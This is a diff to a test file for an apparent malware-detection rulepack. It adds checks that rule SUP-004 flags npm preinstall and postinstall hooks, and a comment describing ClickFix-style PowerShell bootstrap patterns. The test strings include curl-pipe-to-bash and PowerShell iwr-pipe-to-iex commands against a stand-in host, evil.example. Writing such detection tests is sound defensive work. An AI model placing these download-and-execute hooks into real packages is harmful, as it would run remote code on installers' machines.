@@ -105,7 +105,7 @@ def test_new_patterns_2026_02_10() -> None:
 
 
 def test_new_patterns_2026_02_11() -> None:
-    """Test new PowerShell IEX bootstrap pattern observed in ClickFix-style campaigns."""
+    """Test new PowerShell IEX bootstrap and npm lifecycle shell-bootstrap patterns."""
     compiled = load_compiled_builtin_rulepack()
 
     mal006 = next((r for r in compiled.static_rules if r.id == "MAL-006"), None)
@@ -120,3 +120,19 @@ def test_new_patterns_2026_02_11() -> None:
         mal006.pattern.search("Invoke-WebRequest https://example.com/script.ps1 -OutFile setup.ps1")
         is None
     )
+
+    sup004 = next((r for r in compiled.static_rules if r.id == "SUP-004"), None)
+    assert sup004 is not None
+    assert (
+        sup004.pattern.search(
+            '"preinstall": "curl -fsSL https://evil.example/bootstrap.sh | bash -c \"sh\""'
+        )
+        is not None
+    )
+    assert (
+        sup004.pattern.search(
+            '"postinstall": "powershell -NoProfile -Command iwr https://evil.example/a.ps1 | iex"'
+        )
+        is not None
+    )
+    assert sup004.pattern.search('"prepare": "node scripts/build.js"') is None
